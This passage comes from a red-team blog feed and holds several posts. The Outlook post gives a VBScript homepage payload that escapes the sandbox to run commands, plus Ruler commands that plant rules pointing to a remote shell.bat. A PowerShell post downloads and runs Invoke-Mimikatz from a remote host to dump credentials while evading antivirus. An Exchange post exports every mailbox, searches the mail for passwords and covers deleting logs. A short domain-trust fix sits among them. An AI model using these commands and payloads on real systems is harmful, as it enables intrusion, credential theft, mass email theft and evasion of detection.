class="line-numbers language-none"><code class="language-none">you can make your exe in the smb share such as <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Attack%20the%20Outlook%20client/image-20210803153011742.png"></p><pre class="line-numbers language-none"><code class="language-none">Confirm receiving emails with related topics<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Attack%20the%20Outlook%20client/image-20210803153129873.png"></p><pre class="line-numbers language-none"><code class="language-none">read the email target will online like this <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Attack%20the%20Outlook%20client/image-20210803153315676.png"></p><h2 id="The-home-page"><a href="#The-home-page" class="headerlink" title="The home page"></a>The home page</h2><h3 id="Introduction-1"><a href="#Introduction-1" class="headerlink" title="Introduction"></a>Introduction</h3><pre class="line-numbers language-none"><code class="language-none">The Outlooke client provides a feature that allows users to set the home page of the inbox interface while using Outlook, loading external urls through the inbox properties and rendering the inbox page<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Attack%20the%20Outlook%20client/image-20210803163542055.png"></p><pre class="line-numbers language-none"><code class="language-none">As the setting property of the inbox, the inbox homepage URL is synchronized between the Outlook client and the Exchange server. You can directly set this property when interacting with the Exchange server through the MAPI&#x2F;HTTP protocol. Therefore, on the premise that you have legitimate mailbox credentials, you can use this function to set the URL attribute of inbox home page for the mailbox user and point it to the page containing malicious code. When the user browse and refresh the inbox in Outlook, the malicious page will be loaded and the malicious script code will be executed to form the remote command execution<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="Actual-use-1"><a href="#Actual-use-1" class="headerlink" title="Actual use"></a>Actual use</h3><pre class="line-numbers language-html" data-language="html"><code class="language-html">With the aggressive window_onLoad function, an object of type wscript. Shell is created when the page loads, and then the command program is executedNote:The URL to which the home page of the Outlook inbox points is loaded in Outlook via the Iframe tag, and its execution of WScript or VBScript is limited by the sandbox environment, which prevents the script code from being used to create sensitive malicious objects. That is, the CreateObject(" wscript. Shell ") command cannot be executed directly. Here, however, you can escape the Outlook sandbox by loading the ActiveX component associated with the Outlook view, and then getting the ViewCtl1 object from which you can get the application object OutlookApplication, which represents the entire Outlook application. You can then call the CreateObject method directly from the Outlook application object to create a new application object, wscript. Shell, and execute any command<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Content-Language<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en-us<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Content-Type<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/html; charset=windows-1252<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Outlook<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>clientEventHandlersVBS</span> <span class="token attr-name">language</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>vbscript</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript"><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span>  Sub <span class="token function">window_onload</span><span class="token punctuation">(</span><span class="token punctuation">)</span>     Set Application <span class="token operator">=</span> ViewCtl1<span class="token punctuation">.</span>OutlookApplication     Set cmd <span class="token operator">=</span> Application<span class="token punctuation">.</span><span class="token function">CreateObject</span><span class="token punctuation">(</span><span class="token string">"Wscript.Shell"</span><span class="token punctuation">)</span>     cmd<span class="token punctuation">.</span><span class="token function">Run</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">)</span> End Sub<span class="token operator">--</span><span class="token operator">></span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>object</span> <span class="token attr-name">classid</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>clsid:0006F063-0000-0000-C000-000000000046<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>ViewCtl1<span class="token punctuation">"</span></span> <span class="token attr-name">data</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>100%<span class="token punctuation">"</span></span> <span class="token attr-name">height</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>100%<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>object</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Use-Tools"><a href="#Use-Tools" class="headerlink" title="Use Tools"></a>Use Tools</h2><h3 id="From【KB4011091-FIX】"><a href="#From【KB4011091-FIX】" class="headerlink" title="From【KB4011091 FIX】"></a>From【KB4011091 FIX】</h3><pre class="line-numbers language-none"><code class="language-none">get .&#x2F;ruler-osx64 --insecure --url https:&#x2F;&#x2F;192.168.3.144&#x2F;autodiscover&#x2F;autodiscover.xml   --email micle@rootkit.org -u micle -p Admin12345 --verbose --debug form displayadd.&#x2F;ruler-osx64  --insecure --url https:&#x2F;&#x2F;192.168.3.144&#x2F;autodiscover&#x2F;autodiscover.xml   --email micle@rootkit.org -u micle -p Admin12345 --verbose --debug form add --suffix test --input C:\test\t.txt --rule --sendtxt:your command exec codeatt.&#x2F;ruler-osx64  --insecure --url https:&#x2F;&#x2F;192.168.3.144&#x2F;autodiscover&#x2F;autodiscover.xml   --email micle@rootkit.org -u micle -p Admin12345 --verbose --debug  form  send --target icle@rootkit.org --suffix test --subject &quot;test&quot; --body &quot;test&quot;del.&#x2F;ruler-osx64  --insecure --url https:&#x2F;&#x2F;192.168.3.144&#x2F;autodiscover&#x2F;autodiscover.xml   --email micle@rootkit.org -u micle -p Admin12345 --verbose --debug  form  delete --suffix test<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Ruler"><a href="#Ruler" class="headerlink" title="Ruler"></a>Ruler</h3><pre class="line-numbers language-none"><code class="language-none">get.&#x2F;ruler-osx64  --insecure --url https:&#x2F;&#x2F;192.168.3.144&#x2F;autodiscover&#x2F;autodiscover.xml   --email micle@rootkit.org -u micle -p Admin12345 --verbose --debug displayadd.&#x2F;ruler-osx64  --insecure --url https:&#x2F;&#x2F;192.168.3.144&#x2F;autodiscover&#x2F;autodiscover.xml   --email micle@rootkit.org -u micle -p Admin12345 --verbose --debug  —-location &quot;\\\\192.168.3.145\\webdav\\shell.bat&quot; —-trigger test —-name testatt.&#x2F;ruler-osx64  --insecure --url https:&#x2F;&#x2F;192.168.3.144&#x2F;autodiscover&#x2F;autodiscover.xml   --email micle@rootkit.org -u micle -p Admin12345 --verbose --debug send --subject &quot;test&quot;  --body &quot;test&quot;del.&#x2F;ruler-osx64  --insecure --url https:&#x2F;&#x2F;192.168.3.144&#x2F;autodiscover&#x2F;autodiscover.xml   --email micle@rootkit.org -u micle -p Admin12345 -—verbose —-debug delete —id XXXX<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Homepage【CVE-2017-11774修复】"><a href="#Homepage【CVE-2017-11774修复】" class="headerlink" title="Homepage【CVE-2017-11774修复】"></a>Homepage【CVE-2017-11774修复】</h3><pre class="line-numbers language-none"><code class="language-none">the same easy ways.&#x2F;ruler-osx64 --insecure --url https:&#x2F;&#x2F;192.168.3.144&#x2F;autodiscover&#x2F;autodiscover.xml   --email micle@rootkit.org -u micle -p Admin12345 --verbose --debug homepage display.&#x2F;ruler-osx64 --insecure --url https:&#x2F;&#x2F;192.168.3.144&#x2F;autodiscover&#x2F;autodiscover.xml   --email micle@rootkit.org -u micle -p Admin12345 —-verbose -—debug homepage add —-url https:&#x2F;&#x2F;192.168.3.144&#x2F;aspnet_client&#x2F;1.html.&#x2F;ruler-osx64  --insecure --url https:&#x2F;&#x2F;192.168.3.144&#x2F;autodiscover&#x2F;autodiscover.xml   --email micle@rootkit.org -u micle -p Admin12345 -—verbose —-debug homepage delete<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Special-Notes"><a href="#Special-Notes" class="headerlink" title="Special Notes"></a>Special Notes</h3><pre class="line-numbers language-none"><code class="language-none">In some environments, RPC authentication may be successful, but attacks still cannot be attackedIt is not solved at present, and I don&#39;t know the reason for it. If any master knows, please inform me, thank youLike this:<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Attack%20the%20Outlook%20client/image-20210804204540031.png"></p><pre class="line-numbers language-none"><code class="language-none">In my fail&#39;s environment, the ruler meet some problem like this:There is still an error in all English directories, release and personal compilation are not available[*] Autodiscover step 0 - URL: https:&#x2F;&#x2F;192.168.3.144&#x2F;autodiscover&#x2F;autodiscover.xml[*] EXPR provider was selected[*] Authentication scheme is NTLM[*] RPC URL set: http:&#x2F;&#x2F;owa2013.rootkit.org&#x2F;rpc&#x2F;rpcproxy.dll?49f2f623-0a1c-4a39-860f-6fc88d9ee943@rootkit.org:6001[*] Setting up channels[+] Binding to RPCpanic: runtime error: slice bounds out of range [16:0]goroutine 39 [running]:github.com&#x2F;sensepost&#x2F;ruler&#x2F;utils.ReadBytes(...)&#x2F;home&#x2F;staaldraad&#x2F;dev&#x2F;ruler&#x2F;utils&#x2F;utils.go:223github.com&#x2F;sensepost&#x2F;ruler&#x2F;rpc-http.(*RPCResponse).Unmarshal(0xc00010fe50, 0xc0001a8172, 0x1b, 0xe8e, 0x1, 0xc0000f82a0, 0x0)&#x2F;home&#x2F;staaldraad&#x2F;dev&#x2F;ruler&#x2F;rpc-http&#x2F;packets.go:472 +0x37fgithub.com&#x2F;sensepost&#x2F;ruler&#x2F;rpc-http.RPCOpenOut(0xc0004a6070, 0x61, 0xc0004ea000, 0xc0004ea060)&#x2F;home&#x2F;staaldraad&#x2F;dev&#x2F;ruler&#x2F;rpc-http&#x2F;rpctransport.go:237 +0x253created by github.com&#x2F;sensepost&#x2F;ruler&#x2F;rpc-http.RPCOpen&#x2F;home&#x2F;staaldraad&#x2F;dev&#x2F;ruler&#x2F;rpc-http&#x2F;rpctransport.go:190 +0x11b<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Attack%20the%20Outlook%20client/image-20210804204755843.png"></p>]]></content>
      
      
      <categories>
          
          <category> Learning record </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redteam </tag>
            
            <tag> RCE </tag>
            
            <tag> Exchange </tag>
            
            <tag> Ruler </tag>
            
            <tag> Outlook </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>A solution to the failure of the trust relationship between this workstation and the primary domain</title>
      <link href="2021/08/01/a-solution-to-the-failure-of-the-trust-relationship-between-this-workstation-and-the-primary-domain/"/>
      <url>2021/08/01/a-solution-to-the-failure-of-the-trust-relationship-between-this-workstation-and-the-primary-domain/</url>
      
        <content type="html"><![CDATA[<h2 id="The-cause"><a href="#The-cause" class="headerlink" title="The cause"></a>The cause</h2><pre class="line-numbers language-none"><code class="language-none">The domain controller is faulty and is redeployed. The domain machine is found to have the following problems, It cannot be used normally<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/A%20solution%20to%20the%20failure%20of%20the%20trust%20relationship%20between%20this%20workstation%20and%20the%20primary%20domain/image-20210801231855683.png"></p><h2 id="The-solution"><a href="#The-solution" class="headerlink" title="The solution"></a>The solution</h2><pre class="line-numbers language-none"><code class="language-none">The local administrator logs in to the faulty machine, adds it to a group, and restarts it<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/A%20solution%20to%20the%20failure%20of%20the%20trust%20relationship%20between%20this%20workstation%20and%20the%20primary%20domain/image-20210801231947795.png"></p><pre class="line-numbers language-none"><code class="language-none">Restart and then join the domain again<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/A%20solution%20to%20the%20failure%20of%20the%20trust%20relationship%20between%20this%20workstation%20and%20the%20primary%20domain/image-20210801232006784.png"></p><pre class="line-numbers language-none"><code class="language-none">After the system restarts, it can be used normally<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/A%20solution%20to%20the%20failure%20of%20the%20trust%20relationship%20between%20this%20workstation%20and%20the%20primary%20domain/image-20210801232023351.png"></p>]]></content>
      
      
      <categories>
          
          <category> Tips </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Domain environment </tag>
            
            <tag> Operations </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Powershell bypass catch password</title>
      <link href="2021/07/31/powershell-bypass-catch-password/"/>
      <url>2021/07/31/powershell-bypass-catch-password/</url>
      
        <content type="html"><![CDATA[<h2 id="Some-of-the-words"><a href="#Some-of-the-words" class="headerlink" title="Some of the words"></a>Some of the words</h2><pre class="line-numbers language-none"><code class="language-none">From a practical point of view, solve the practical problems encountered, simple record, can bypass 360 and HuoRong<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><pre class="line-numbers language-none"><code class="language-none">According to PowerShell&#39;s default policy, ps1 scripts are not allowed to executeGet-executionpolicy indicates that the current policy is Restricted<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Powershell%20bypass%20catch%20password/1.png"></p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">You can change the execution policy with the administrator permission<span class="token punctuation">.</span> <span class="token keyword">Do</span> not ask me why I have the administrator permission<span class="token punctuation">.</span> You can not <span class="token keyword">catch</span> passwords with the normal user<span class="token function">Set-ExecutionPolicy</span> Unrestricted<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Powershell%20bypass%20catch%20password/2.png"></p><h2 id="Actual-use"><a href="#Actual-use" class="headerlink" title="Actual use"></a>Actual use</h2><h3 id="PSV2"><a href="#PSV2" class="headerlink" title="PSV2"></a>PSV2</h3><pre class="line-numbers language-none"><code class="language-none">as we all known the easy way like thispowershell -exec bypass -C &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http:&#x2F;&#x2F;192.168.159.1:8888&#x2F;Invoke-Mimikatz.ps1&#39;);Invoke-Mimikatz -DumpCreds&quot;now you can use the v2 maybe can bypass some av like thispowershell -Version 2 -exec bypass -C &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http:&#x2F;&#x2F;192.168.159.1:8888&#x2F;Invoke-Mimikatz.ps1&#39;);Invoke-Mimikatz -DumpCreds&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Powershell%20bypass%20catch%20password/3.png"></p><h3 id="Encode-script"><a href="#Encode-script" class="headerlink" title="Encode script"></a>Encode script</h3><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">as we all know the Powersploit project<span class="token punctuation">,</span> how about use this project to bypass?Here we use the <span class="token function">out-encryptedScript</span> to place the script in the same directory as the MimiKatz script<span class="token punctuation">,</span> and then encrypt it in turn<span class="token function">Import-Module</span> <span class="token punctuation">.</span>\<span class="token function">Out-EncryptedScript</span><span class="token punctuation">.</span>ps1<span class="token function">Out-EncryptedScript</span> <span class="token operator">-</span>ScriptPath <span class="token punctuation">.</span>\<span class="token function">Invoke-Mimikatz</span><span class="token punctuation">.</span>ps1 <span class="token operator">-</span>Password woshijiamide <span class="token operator">-</span>Salt safety<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Powershell%20bypass%20catch%20password/4.png">```</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">let our ps1script up to our tar then like thispowershell<span class="token punctuation">.</span>exe<span class="token function">IEX</span><span class="token punctuation">(</span><span class="token function">New-Object</span> Net<span class="token punctuation">.</span>WebClient<span class="token punctuation">)</span><span class="token punctuation">.</span>DownloadString<span class="token punctuation">(</span><span class="token string">"http://192.168.159.1:8888/Out-EncryptedScript.ps1"</span><span class="token punctuation">)</span> <span class="token namespace">[String]</span> <span class="token variable">$cmd</span> = <span class="token function">Get-Content</span> <span class="token punctuation">.</span>\new1<span class="token punctuation">.</span>ps1<span class="token function">Invoke-Expression</span> <span class="token variable">$cmd</span><span class="token variable">$decrypted</span> = de woshijiamide safety<span class="token function">Invoke-Expression</span> <span class="token variable">$decrypted</span><span class="token function">Invoke-Mimikatz</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Powershell%20bypass%20catch%20password/5.png"></p><pre class="line-numbers language-none"><code class="language-none">the same way, Of course, both files are put remote, also does not affect the final effect maybe will get some wrong, but we also can catch PW<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Powershell%20bypass%20catch%20password/6.png"></p>]]></content>
      
      
      <categories>
          
          <category> Learning record </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redteam </tag>
            
            <tag> Bypass </tag>
            
            <tag> Mimikatz </tag>
            
            <tag> Powershell </tag>
            
            <tag> Catch Password </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Exchange Export email methods</title>
      <link href="2021/07/30/exchange-export-email-methods/"/>
      <url>2021/07/30/exchange-export-email-methods/</url>
      
        <content type="html"><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><pre class="line-numbers language-none"><code class="language-none">Assuming that you have obtained the administrative rights of the Exchange server, what you need to do now is to search and export the emails in the server, so as to obtain more critical and sensitive information, such as looking for passwords and personal information<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="Basic-information-Acquisition"><a href="#Basic-information-Acquisition" class="headerlink" title="Basic information Acquisition"></a>Basic information Acquisition</h2><pre class="line-numbers language-none"><code class="language-none">Get your tar accountGet-MailboxStatistics -Identity yangsir |fl<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Exchange%20Export%20email%20methods/iShot2021-07-3016.20.29.png"></p><h2 id="Manager"><a href="#Manager" class="headerlink" title="Manager"></a>Manager</h2><h3 id="PSSession"><a href="#PSSession" class="headerlink" title="PSSession"></a>PSSession</h3><pre class="line-numbers language-none"><code class="language-none">$User &#x3D; &quot;rootkit.org\administrator&quot;$Pass &#x3D; ConvertTo-SecureString -AsPlainText admin!@#45 -Force$Credential &#x3D; New-Object System.Management.Automation.PSCredential -ArgumentList $User,$Pass$Session &#x3D; New-PSSession -ConfigurationName Microsoft.Exchange -ConnectionUri http:&#x2F;&#x2F;OWA2013&#x2F;PowerShell&#x2F; -Authentication Kerberos -Credential $CredentialImport-PSSession $Session -AllowClobber<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Exchange%20Export%20email%20methods/iShot2021-07-3016.20.35.png"></p><pre class="line-numbers language-none"><code class="language-none">session address must be fqdn, if not fqdn will wrong like this<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Exchange%20Export%20email%20methods/iShot2021-07-3016.20.39.png"></p><pre class="line-numbers language-none"><code class="language-none">get pssession info：Get-PSSessionstop PSSession：Remove-PSSession $Sessionget account：Get-Mailbox<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Exchange%20Export%20email%20methods/iShot2021-07-3016.20.46.png"></p><h3 id="Use-exchange"><a href="#Use-exchange" class="headerlink" title="Use exchange"></a>Use exchange</h3><pre class="line-numbers language-none"><code class="language-none">add the manager unitAdd-PSSnapin Microsoft.Exchange.Management.PowerShell.SnapIn;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="MSDN-info"><a href="#MSDN-info" class="headerlink" title="MSDN info"></a>MSDN info</h4><pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;docs.microsoft.com&#x2F;en-us&#x2F;powershell&#x2F;module&#x2F;exchange&#x2F;?view&#x3D;exchange-ps<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="Get-all-account"><a href="#Get-all-account" class="headerlink" title="Get all account"></a>Get all account</h4><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Exchange%20Export%20email%20methods/iShot2021-07-3016.20.50.png"></p><h4 id="Get-all-mailbox-information-including-the-number-of-messages-the-last-time-to-access-the-mailbox"><a href="#Get-all-mailbox-information-including-the-number-of-messages-the-last-time-to-access-the-mailbox" class="headerlink" title="Get all mailbox information, including the number of messages, the last time to access the mailbox"></a>Get all mailbox information, including the number of messages, the last time to access the mailbox</h4><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Exchange%20Export%20email%20methods/iShot2021-07-3016.20.58.png"></p><h4 id="Get-all-ou"><a href="#Get-all-ou" class="headerlink" title="Get all ou"></a>Get all ou</h4><pre class="line-numbers language-none"><code class="language-none">Get-OrganizationalUnit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Exchange%20Export%20email%20methods/iShot2021-07-3016.21.07.png"></p><h4 id="Get-the-follow-log"><a href="#Get-the-follow-log" class="headerlink" title="Get the follow log"></a>Get the follow log</h4><pre class="line-numbers language-none"><code class="language-none">system dir %ExchangeInstallPath%TransportRoles\Logs\MessageTracking<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Exchange%20Export%20email%20methods/iShot2021-07-3016.21.13.png"></p><h4 id="Gets-the-sender-information-of-the-specified-sender"><a href="#Gets-the-sender-information-of-the-specified-sender" class="headerlink" title="Gets the sender information of the specified sender"></a>Gets the sender information of the specified sender</h4><pre class="line-numbers language-none"><code class="language-none">See yangsir@rootkit.org for information about all emails sent from 18:00, 28 July 2021 to presentGet-MessageTrackingLog -Start &quot;07&#x2F;28&#x2F;2019 18:00:00&quot; -Sender &quot;yangsir@rootkit.org&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Exchange%20Export%20email%20methods/iShot2021-07-3016.21.18.png"></p><pre class="line-numbers language-none"><code class="language-none">same way to the example<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Exchange%20Export%20email%20methods/iShot2021-07-3016.21.21.png"></p><pre class="line-numbers language-none"><code class="language-none">Get more easy infoGet-MessageTrackingLog -EventID send -Start &quot;07&#x2F;28&#x2F;2019 18:00:00&quot; -Sender &quot;yangsir@rootkit.org&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Exchange%20Export%20email%20methods/iShot2021-07-3016.21.25.png"></p><h2 id="Export"><a href="#Export" class="headerlink" title="Export"></a>Export</h2><h3 id="PSSession-1"><a href="#PSSession-1" class="headerlink" title="PSSession"></a>PSSession</h3><pre class="line-numbers language-none"><code class="language-none">Need connection<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Exchange%20Export%20email%20methods/iShot2021-07-3016.21.30.png"></p><pre class="line-numbers language-none"><code class="language-none">Adds the current user to the Mailbox Import Expor role group<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Exchange%20Export%20email%20methods/iShot2021-07-3016.21.33.png"></p><h4 id="Export-special-user"><a href="#Export-special-user" class="headerlink" title="Export  special user"></a>Export  special user</h4><pre class="line-numbers language-none"><code class="language-none">$User &#x3D; &quot;yangsir&quot;New-MailboxexportRequest -mailbox $User -FilePath (&quot;\\localhost\c$\daochu\&quot;+$User+&quot;.pst&quot;)this way to export the daochu dir<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Exchange%20Export%20email%20methods/iShot2021-07-3016.21.39.png"></p><h4 id="Export-the-key-from-email"><a href="#Export-the-key-from-email" class="headerlink" title="Export the key from email"></a>Export the key from email</h4><pre class="line-numbers language-none"><code class="language-none">$User &#x3D; &quot;yangsir&quot;New-MailboxexportRequest -mailbox $User -ContentFilter &#123;(body -like &quot;*pass*&quot;)&#125; -FilePath (&quot;\\localhost\c$\daochu1\&quot;+$User+&quot;.pst&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Exchange%20Export%20email%20methods/iShot2021-07-3016.39.00.png"></p><h4 id="Export-all-email"><a href="#Export-all-email" class="headerlink" title="Export all email"></a>Export all email</h4><pre class="line-numbers language-none"><code class="language-none">Get-Mailbox -OrganizationalUnit Users -Resultsize unlimited |%&#123;New-MailboxexportRequest -mailbox $_.name -FilePath (&quot;\\localhost\c$\all\&quot;+($_.name)+&quot;.pst&quot;)&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="Export-log"><a href="#Export-log" class="headerlink" title="Export log"></a>Export log</h4><pre class="line-numbers language-none"><code class="language-none">get log <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Exchange%20Export%20email%20methods/iShot2021-07-3016.39.04.png"></p><pre class="line-numbers language-none"><code class="language-none">you can use this way to not make log<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Exchange%20Export%20email%20methods/iShot2021-07-3016.39.08.png"></p><pre class="line-numbers language-none"><code class="language-none">del all log<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Exchange%20Export%20email%20methods/iShot2021-07-3016.39.12.png"></p><h4 id="PS-AUTO"><a href="#PS-AUTO" class="headerlink" title="PS 